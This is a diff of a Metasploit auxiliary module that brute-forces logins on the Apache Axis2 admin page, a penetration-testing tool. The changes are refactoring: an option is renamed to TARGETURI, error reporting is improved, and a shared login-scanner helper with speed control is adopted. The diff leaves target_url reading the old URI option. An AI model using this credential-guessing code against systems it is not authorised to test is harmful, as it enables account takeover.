@@ -21,13 +21,12 @@ class Metasploit3 < Msf::Auxiliary
       'Name'           => 'Apache Axis2 Brute Force Utility',
       'Description'    => %q{
         This module attempts to login to an Apache Axis2 instance using
-        username and password combindations indicated by the USER_FILE,
+        username and password combinations indicated by the USER_FILE,
         PASS_FILE, and USERPASS_FILE options. It has been verified to
         work on at least versions 1.4.1 and 1.6.2.
       },
       'Author'         =>
         [
-          '==[ Alligator Security Team ]==',
           'Leandro Oliveira <leandrofernando[at]gmail.com>'
         ],
       'References'     =>
@@ -40,24 +39,27 @@ class Metasploit3 < Msf::Auxiliary
 
     register_options( [
       Opt::RPORT(8080),
-      OptString.new('URI', [false, 'Path to the Apache Axis Administration page', '/axis2/axis2-admin/login']),
+      OptString.new('TARGETURI', [false, 'Path to the Apache Axis Administration page', '/axis2/axis2-admin/login']),
     ], self.class)
   end
 
+  # For print_* methods
   def target_url
     "http://#{vhost}:#{rport}#{datastore['URI']}"
   end
 
   def run_host(ip)
+    uri = normalize_uri(target_uri.path)
 
     print_status("Verifying login exists at #{target_url}")
     begin
       send_request_cgi({
         'method'  => 'GET',
-        'uri'     => datastore['URI']
+        'uri'     => uri
       }, 20)
-    rescue
-      print_error("The Axis2 login page does not exist at #{target_url}")
+    rescue => e
+      print_error("Failed to retrieve Axis2 login page at #{target_url}")
+      print_error("Error: #{e.class}: #{e}")
       return
     end
 
@@ -76,15 +78,13 @@ class Metasploit3 < Msf::Auxiliary
     cred_collection = prepend_db_passwords(cred_collection)
 
     scanner = Metasploit::Framework::LoginScanner::Axis2.new(
-      host: ip,
-      port: rport,
-      uri: datastore['URI'],
-      proxies: datastore["PROXIES"],
-      cred_details: cred_collection,
-      stop_on_success: datastore['STOP_ON_SUCCESS'],
-      connection_timeout: 5,
-      user_agent: datastore['UserAgent'],
-      vhost: datastore['VHOST']
+      configure_http_login_scanner(
+        uri: uri,
+        cred_details: cred_collection,
+        stop_on_success: datastore['STOP_ON_SUCCESS'],
+        bruteforce_speed: datastore['BRUTEFORCE_SPEED'],
+        connection_timeout: 5
+      )
     )
 
     scanner.scan! do |result|
